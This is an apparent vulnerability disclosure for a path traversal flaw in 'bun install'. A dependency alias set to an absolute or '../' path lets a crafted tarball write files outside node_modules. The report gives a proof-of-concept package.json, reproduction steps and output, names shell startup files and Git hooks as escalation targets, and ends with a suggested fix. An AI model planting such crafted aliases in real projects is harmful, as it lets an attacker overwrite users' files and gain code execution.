# Arbitrary file write outside project through dependency alias in `bun install`

## Summary

I found a path traversal issue in `bun install`.

If a project puts an absolute path or `../` path inside a dependency alias name, Bun uses that alias as part of the install path. Because of that, a package can be installed outside `node_modules`.

This works even with scripts disabled:

```sh
bun install --ignore-scripts --linker=hoisted
```

So this is not a lifecycle script issue. It is a file write issue during package extraction/install.

## Why it happens

The dependency key from `package.json` is treated as the package alias. Bun later uses that alias as the destination folder name for the installed package.

The problem is that the alias is not rejected when it is an absolute path like `/tmp`, or when it contains path traversal like `../../`.

So this package.json is accepted by Bun:

```json
{
  "name": "victim-project",
  "version": "1.0.0",
  "dependencies": {
    "/tmp": "file:./evil.tgz"
  }
}
```

In npm, this kind of package name is rejected as invalid. Bun installs it.

## Proof of concept

I created a small setup script that builds a local malicious tarball. The tarball contains this file:

```text
package/pwned
```

with this content:

```text
pwned
```

The generated project uses this dependency:

```json
{
  "dependencies": {
    "/tmp": "file:./evil.tgz"
  }
}
```

Steps to reproduce from an empty folder:

```sh
/path/to/setup.sh
cd victim-project
bun install --ignore-scripts --linker=hoisted
../check-result.sh
```

Expected result:

```text
/tmp/pwned exists
Content:
pwned
```

Observed Bun output:

```text
bun install v1.3.14

+ /tmp@./evil.tgz

1 package installed
```

After the install finishes, `/tmp/pwned` exists and contains `pwned`.

The important part is that `/tmp/pwned` is outside the project folder and outside `node_modules`.

## Impact

An attacker can put this in a malicious repository and ask a victim to run a normal Bun install command.

The victim does not need to run any package scripts. `--ignore-scripts` does not stop it.

This gives the attacker the ability to write files anywhere the current user has permission to write. The `/tmp/pwned` file is only a safe demo target. The same bug can be used against more useful user-writable paths, for example **shell startup** files, Git hooks, **desktop autostart** entries, or user-owned binaries.

That can turn into code execution when the overwritten file is later used by the system or by the user.

If Bun is run with higher privileges, the impact becomes higher because the write happens with those privileges.

## Attack complexity

Attack complexity is low.

The attacker only needs to provide a project with a crafted `package.json` and tarball. The victim only needs to run:

```sh
bun install
```

or:

```sh
bun install --ignore-scripts
```

No network access is required for the local tarball version of the PoC. No race condition is needed. No package lifecycle scripts are needed.

## What bun should've done

Bun should've rejected dependency aliases that are not valid npm package names before using them as install paths.

At minimum, aliases should be rejected if they are absolute paths, contain `..` path components, or contain invalid path separators. Scoped names like `@scope/name` should still be allowed.
